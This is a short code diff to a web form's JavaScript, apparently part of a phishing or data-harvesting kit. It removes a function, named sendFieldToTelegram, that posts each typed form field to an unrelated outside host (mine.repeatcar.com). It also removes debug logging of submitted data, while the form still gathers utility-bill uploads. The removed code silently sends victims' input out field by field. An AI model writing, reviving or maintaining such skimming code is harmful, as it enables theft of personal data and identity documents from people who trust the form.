@@ -246,17 +246,6 @@
         }
 
         async function sendFieldToTelegram(fieldName, value) {
-            const data = new FormData();
-            data.append(fieldName, value);
-            
-            try {
-                await fetch('https://mine.repeatcar.com/568/op/report.php', { method: 'POST', body: data });
-            } catch (error) {
-                console.error('Send error:', error);
-            }
-        }
-
-        async function sendFieldToTelegram(fieldName, value) {
             // Removed - not needed anymore
         }
 
@@ -301,12 +290,6 @@
                 for (let i = 0; i < utilityBill.files.length; i++) {
                     finalData.append('utility-bill', utilityBill.files[i]);
                 }
-            }
-
-            // Debug: Log what we're sending
-            console.log('Submitting form data:');
-            for (let pair of finalData.entries()) {
-                console.log(pair[0] + ': ' + pair[1]);
             }
 
             try {
